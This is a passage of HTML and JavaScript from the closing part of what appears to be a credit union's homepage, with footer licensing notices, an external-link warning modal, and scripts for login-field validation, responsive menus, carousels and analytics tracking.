					<li><a href="">History of Alaska&nbsp;USA</a></li>
					</ul>
				</dd>
			</dl>
    		</nav>
		</div>
		<div id="footer_legal">
			<p>&#169; Copyright 2019</p>
			<p>Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
			<p><a href="">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
			<p>Real Estate loans are provided by Alaska USA Federal Credit Union in Alaska, Arizona, Washington, NMLS ID #409001. Mortgage loans are provided by Alaska&nbsp;USA Federal Credit Union in Arizona, NMLS ID #409001. Mortgage loans are provided by Alaska&nbsp;USA Federal Credit Union in Arizona, NMLS ID #409001. Mortgage loans are provided by Alaska&nbsp;USA Mortgage Company, LLC in Alaska, Washington and California. License #AK157293; Washington Consumer Loan Company License #CL-157293; Licensed by the Department of Business Oversight under the California Residential Mortgage Lending Act, License #4131067.</p>
			<p>Products offered through Alaska USA Insurance Brokers, LLC, are provided by various carriers and are an obligation of the issuing company. They are not obligations of or deposits to Alaska USA Federal Credit Union or its subsidiaries, and are not insured by the National Credit Union Administration or any other agency of the United States. Some products not available in all states.</p>
			<ul class="bug">
				<li><a href="/exit.asp?id=ncusif" class="ext"><img src="https://www.alaskausa.org/images/nav/ncua.png" width="146" height="65" alt="Member accounts insured up to $250,000 by NCUA"><br>Federally insured by NCUA</a></li>
				<li><img src="https://www.alaskausa.org/images/nav/EHL.png" width="55" height="59" alt="Equal Housing Lender">&nbsp;</li>
			</ul>
		</div>
	</div><!--#footer-->
	<div id="topLink"><a href="#pgBody"><span class="visuallyhidden">top</span></a></div>
</div> <!--#siteFooter-->
<div class="main_overlay"></div>
	<div class="modal" id="siteExit" style="display:none;">
		<div class="col">
			<h3>Leaving alaskausa.org</h3>
			<a class="modal_close" href="#" role="button"><span class="AkusaIcon-cancel-x"><span class="visuallyhidden">Close</span></span></a>
			<p>You are about to visit a third-party website not&nbsp;operated by Alaska&nbsp;USA Federal Credit Union.</p>
			<p>Alaska&nbsp;USA Federal Credit Union is not responsible for the product, service, or website content on any external third-party sites and does not represent either you or the website operator if you enter into a transaction.&nbsp;  Alaska&nbsp;USA Federal Credit Union's privacy and security policies do not apply to the linked site.</p>
			<p class="center"><a id="continue" class="linkBtn" href="#">Continue</a></p>
		</div>
	</div>

<script>// all ub-related js is collected in the ub object
var ub={
	fG : document.getElementById("SignInGlobal"),
	fM : document.getElementById("SignInMobile"),
	fH : document.getElementById("SignInHome"),
	fU : document.getElementById("SignInUB"),
	fW : document.getElementById("SignInWebpay"),
//	f : fH || fG || fM || fU ,//"either fG or fH depending on context"
	/*invalidChars : " ,'`&?<>/\\\|[]:;~!*\"" */
	invalidChars : String.fromCharCode(32,44,39,96,38,63,60,62,47,92,124,91,93,58,59,126,33,42,34),
	Initialize : function(){ } ,
	CheckEntries : function(event){
		if (event.keyCode == 13){
			if (ub.f.UserName.value.length === 0) {ub.f.UserName.focus();}
		}
	},
	
	DoSubmit : function (e){// Validate userid against nonsensical, invalid or empty submissions
		e=e || window.event;
		var f=e.target || e.srcElement;
		var username = f.UserName.value.replace(/^\s+|\s+$/g, "");
		if(username.length===0 || username.toLowerCase()=="user id"){
			window.alert("Please enter your User ID");
			f.UserName.focus();
			return false;
		}
		if(ub.hasInvalidChar(username)){
			window.alert("User ID contains an invalid character.");
			f.UserName.focus();
			return false;
		}
		f.Referrerfield.value = document.referrer;
		f.UserName.value = username;
		return true;
	},
	hasInvalidChar : function(str){
		for(var c=0;c<ub.invalidChars.length;c++){
			if(str.indexOf(ub.invalidChars.charAt(c)) > -1){ return true; }
		}
		return false;
	}
};
if(ub.fG){
	ub.fG.onsubmit=ub.DoSubmit;
	ub.fG.setAttribute("autocomplete","off");
}
if(ub.fM){
	ub.fM.onsubmit=ub.DoSubmit;
	ub.fM.setAttribute("autocomplete","off");
}
if(ub.fH){
	ub.fH.onsubmit=ub.DoSubmit;
	ub.fH.setAttribute("autocomplete","off");
//	ub.fH.UserNameHome.focus();
}
if(ub.fU){
	ub.fU.onsubmit=ub.DoSubmit;
	ub.fU.setAttribute("autocomplete","off");
}
if(ub.fW){
	ub.fW.onsubmit=ub.DoSubmit;
	ub.fW.setAttribute("autocomplete","off");
}

</script>
<script src="https://www.alaskausa.org/js/jquery-1.11.3.min.js"></script>
<script src="https://www.alaskausa.org/js/jsSuite-1.9.5.js"></script>
<script src="https://www.alaskausa.org/js/jquery.accAccordion.js"></script>
<script src="https://www.alaskausa.org/js/jquery.leanModal.AKUSA.2.1.js"></script>
<script>
function lmMini(e){
	e=e || window.event;
	var t=(e.target || e.srcElement);
	var $lm=$(t).closest(".learnMore");
	$lm.toggleClass("active");
	//return false;
}
// Toggle controls
function loadToggle (){
	var h=location.hash.replace("#","");
	if(h !== ""){
		$("#" + h).addClass("show");
	}
}
function toggleContent (e){
	e = e || window.event;
	var tgtEl=e.target || e.srcElement;
	$(tgtEl).closest(".toggle").toggleClass("show");
	return false;
}
function toggleList (e){
	e = e || window.event;
	var tgtEl=e.target || e.srcElement;
//	alert($(tgtEl).closest("dt")[0]);
	$(tgtEl).closest("dt").toggleClass("show");
	return false;
}

var resizePreviousView = "";
function handleResize() {
	var resizeCurrentView = window.innerWidth < 768 ? "m" : "d";
	if (resizeCurrentView == resizePreviousView) { return true; }	//only trigger this event when we switch modes, chrome fires resize on keyboard pop which breaks superfish
	else { resizePreviousView = resizeCurrentView; }

	if (window.innerWidth < 768) {
		$(".shortcuts").addClass("hide");
		$("ul.tools").appendTo($(".flyin"));
		$("ul.sections").appendTo($(".flyin"));
		$(".globalNav").appendTo($(".flyin"));
		$(".flyin .tools #ubMenu div.menu").prependTo($("#persistentLogin"));
		$("#navBar").hide();	//do this here so non-js browsers still see it.  need to hide because it is over the top of the mobileMenu
		if ($(".globalNav .menu > li .close").length == 0) {
			$(".globalNav .menu").prepend("<a class='close'><span class='AkusaIcon-cancel-x'><span class='visuallyhidden'>Close<\/span><\/span><\/a>")
			$(".globalNav .menu .close")
				.unbind('click')
				.bind('click', function () {
					$(this).closest((".globalNav > li")).superfish('hide');
					return false;
				});
		}
		//always unbind before binding so we don't have multiple events
		$('#homeAccBtn').show().unbind('click').bind('click', function () {
			//$(".accordion").toggleClass("hide");
			$(".menu", "#persistentLogin").fadeToggle('fast');
			$('#homeAccBtn').toggleClass('active');
			//$('#persistentLogin').slideToggle(); //toggleClass('hide');
			return false;
		});
		$('#persistentLogin .close').unbind('click').bind('click', function () {
			$(".menu", "#persistentLogin").fadeToggle('fast');
			$('#homeAccBtn').toggleClass('active');
			return false;
		});
	}
	else {
		//undo the things we moved around in the phone-only section
		$(".shortcuts").removeClass("hide");
		$("ul.sections").appendTo($(".siteHeader > div")[0]);
		$("div.menu", "#persistentLogin").appendTo("ul.tools #ubMenu");	//put the login back;
		if($("#ubMenu").is(".sfHover")){
			$("#ubMenu > .menu").css("display","block");
		} else {
			$("#ubMenu > .menu").css("display","none");
		}
		$("ul.tools").appendTo($(".siteHeader > div")[0]);
		$(".globalNav").prependTo($("#navBar"));
		$("#navBar").show();
		$('#homeAccBtn').hide();
		$(".globalNav .menu > li a.close").remove();
		//$(".shortcuts").toggleClass("hide");

		//desktop only
		//$('a[class*=leanModal]').lnModalExt({ top: "center" });

	}
}

$(document).ready(function() {
	handleResize();
	$(window).resize(handleResize);
//	$("#openMenu").on("click",toggleSideMenu);
	$(".main_overlay").on("click",toggleSideMenu);
	$('ul.tools').superfish({ delay: 0, speed: 'fast', animation: { opacity: 'show' }, autoArrows: false }).sfAria();
	$("ul.globalNav").superfish({ delay: 0, speed: 'normal', animation: { opacity: 'show' }, autoArrows: false, onShow: slideMenuIntoView }).sfAria();
	$(".learnMore h2").on("click", lmMini);
	$(".toggleTitle a").bind("click", toggleContent);
//	$("dl.toggle > dt a").bind("click", toggleList);
	$("#fsm").accAccordion({allowAllClosed : true,allowMultipleOpen : false});

	$(".tabSet").tabSet();
	// bind a click event to the 'skip' link to enable proper behaviof in IE
	$(".skipLinks a").click(function(event){
	    var skipTo="#"+this.href.split('#')[1];
	    $(skipTo).attr('tabindex', -1).on('blur focusout', function () {
	        $(this).removeAttr('tabindex');
	    }).focus(); // focus on the content container
	});
	$('.flyin').sideMenuAria({btnContainer:'#navMenuBtn',menuContainer:'.flyin'});
	$('a[class*=leanModal]').lnModalExt();
	addDisclosureToExternalLinks();
});
</script>

<script>
function toggleSideMenu(){
	$("#pgBody").toggleClass("active");
	if($('#pgBody').hasClass('active')){
		$(".flyin").height(document.body.clientHeight);
		$(".main_overlay").height(document.body.clientHeight);
		$('.flyin .tools li>a').first().focus();
	}
	return false;
}

// used for superfish menu attached to .globalNav.  For onShow, "this" is the opened ul
function slideMenuIntoView() {
	if($(this).offset().top < window.scrollY) {
		var menuItem = $(this).closest("li");
		var newTop = $(menuItem).offset().top + $(menuItem).height() - window.innerHeight;
		if($(menuItem).attr("id") == "search") { newTop = $(menuItem).offset().top; } //they'll probably pop the keyboard. give them lots of room
		if(newTop < 0) { newTop = 0; }
		$("html, body").animate({
			scrollTop: newTop
		},500);
	}
}

function addDisclosureToExternalLinks(){
	var AkusaDomains = [
		"alaskausa.org","alaskausamortgage.com","procuramortgage.com","alaskausatitle.com",
		"akusaapps","purchaseone.org","alaskausafoundation.org"
	];
	var AffiliateDomains = [
		"public.isillc.com","tools.safeco.com","ultipro.com","scorecardrewards.com","iraservicecenter.com"
	];
	// Test absoluteURL links in main:
	//		header doesn't contain external links, and those in footer are already marked as .ext
	//		Also don't text links that have been manually tagged ".ext, .aff, .akusa" (external,affiliate,akusa)
	$("main a[href^='http']").not(".ext, .aff, .akusa").each(function(){
		// tag links .akusa,.aff, or .ext (the rest)
		var i,len,cls="ext";
		for(i=0,len=AkusaDomains.length; i<len ; i++){
			if(this.href.toLowerCase().indexOf(AkusaDomains[i])>-1){
				cls="akusa";
				break;
			}
		}
		if(cls=="ext"){
			for(i=0,len=AffiliateDomains.length; i<len ; i++){
				if(this.href.toLowerCase().indexOf(AffiliateDomains[i])>-1){
					cls="aff";
					break;
				}
			}
		}
		$(this).addClass(cls);
	});
	// now activate lnModalExt on all external links
	$("a.ext").attr("data-modal-alert","true").lnModalExt().bind("click",function(e){
		$("#continue")[0].href=$(this)[0].href;
		$("#continue").closest(".modal").find(".modal_close").focus();
		$("#continue").focus();
	});
}
</script>


<script>
$(document).ready(function() {
	agf.pageview();
	AddTracker();
});
function FlagUB() { agf.pageview({ page: "/external-ub-login/" }); }
function AddTracker() {
	var a = document.getElementsByTagName('a');
	var AdId;
	for(i = 0; i < a.length; i++){
		// Automatically tag and track ad clicks if the link has an associated AdId
		if(a[i].search.indexOf("aid=") > 0){
			AdId = a[i].search.match(/aid\=([\w\d\-\_\+]*)/i)[1];
			a[i].onclick = function () {
				var link = this.href, pg="/actions/promo/" + AdId + "/action:adclick";
				agf.pageview({ page: pg, title:"Promo link - AdId:" + AdId });
				setTimeout(function () { location.href = link; }, 50);
				return false;
			};
		}

		if ( a[i].href.indexOf(location.host) == -1 ) {
			// External links - href doesn't contain location.host
			if (!(a[i].getAttribute("target")) || (a[i].getAttribute("target") == "") ){
				// If no target specified in link (pop-up window), set tracker, pause, then navigate
//				a[i].onclick = function () {
//					var link = this.href, pg="/external/" + link.replace("://",":");
//					agf.pageview({ page: pg });
//					setTimeout(function () { location.href = link; }, 50);
//					return false;
//				};
			} else {
				// Target specified in link (pop-up window), set tracker, pause, then allow navigation to continue
//				a[i].onclick = function(){
//					var link = this.href, pg="/external/" + link.replace("://",":");
//					agf.pageview({ page: "/external/" + pg });
//					return true;
//				};
			}
		} else if ( a[i].href.indexOf("exit.asp") > 0 && a[i].className.indexOf("ext")<0) {
			// Internal links (exit to external links not tracked because of site exit dialog)
			a[i].onclick = function () {
				var link = this.href;
				agf.pageview({ page: link.replace(location.host, "").replace(location.protocol + "///", "/") });
				setTimeout(function () { location.href = link; }, 50);
				return false;
			}
		};
	}
}
</script>

</div><!-- #pgBody -->
<script src="https://www.alaskausa.org/js/jquery/slick/slick.181.js"></script>
<script type="text/javascript">
function acMini(hIn){
	var $h=$(hIn);
	var $ac=$h.closest(".linkList");
	$ac.toggleClass("active");
	return false;
}

var resizePreviousView_default = "";
function handleResize_default() {
	var resizeCurrentView = window.innerWidth < 768 ? "m" : "d";
	if (resizeCurrentView == resizePreviousView_default) { return true; }
	else { resizePreviousView_default = resizeCurrentView; }

	if ($(window).width() < 768) {
		$("#acPayments + dd .container").appendTo($("#makepayment .menu", ".mobileMenu"));
		$("#acApply + dd .container").appendTo($("#openaccount .menu", ".mobileMenu"));
		$("#acQuotes + dd .container").appendTo($("#applyquote .menu", ".mobileMenu"));

		var sf = $("ul.mobileMenu").superfish({ delay: 0, speed: 'normal', animation: { opacity: 'show' }, autoArrows: false });
		$(".AkusaIcon-cancel-x", ".mobileMenu #makepayment").unbind('click').bind('click', function () { sf.children('li#makepayment').superfish('hide'); });
		$(".AkusaIcon-cancel-x", ".mobileMenu #openaccount").unbind('click').bind('click', function () { sf.children('li#openaccount').superfish('hide'); });
		$(".AkusaIcon-cancel-x", ".mobileMenu #applyquote").unbind('click').bind('click', function () { sf.children('li#applyquote').superfish('hide'); });
	} else {
		$("#makepayment .menu .container", ".mobileMenu").appendTo($("#acPayments + dd"));
		$("#openaccount .menu .container", ".mobileMenu").appendTo($("#acApply + dd"));
		$("#applyquote .menu .container", ".mobileMenu").appendTo($("#acQuotes + dd"));
	}
}
// Use jquery to perform page init activities
$(document).ready(function () {
	handleResize_default();
	$(window).resize(handleResize_default);
	$(".accordion").accAccordion()
	$("#UserNameHome").focus();

	$('.hero').slick({
		mobileFirst:true,

		initialSlide:Math.floor(Math.random() * $(".hero > div").length),

		slidesToShow:1,
		slidesToScroll:1,
		swipe:true,
		autoplay:true,
		autoplaySpeed:10000,
		arrows:false,
		dots:true,
		fade:true,
		pauseOnDotsHover:true,
		respondTo:'min'
	});


	$('.slick').slick({
		mobileFirst: true, slidesToShow: 1, slidesToScroll: 1, infinite: true, swipe: true,
		initialSlide:Math.floor(Math.random() * $(".slider .slide").length),
		responsive:[
			{
				breakpoint: 768,
				settings: { slidesToShow: 2, slidesToScroll: 1, infinite: true, swipe: true }
			}
		]
	});
	if(window.location.hash=="" && window.location.search==""){
		var header=document.getElementsByClassName("siteHeader")[0];
		if(header){
			setTimeout("if(window.scrollY != 0)document.getElementsByClassName('siteHeader')[0].scrollIntoView();",150);
		}
	}

});

</script>
</body>
</html>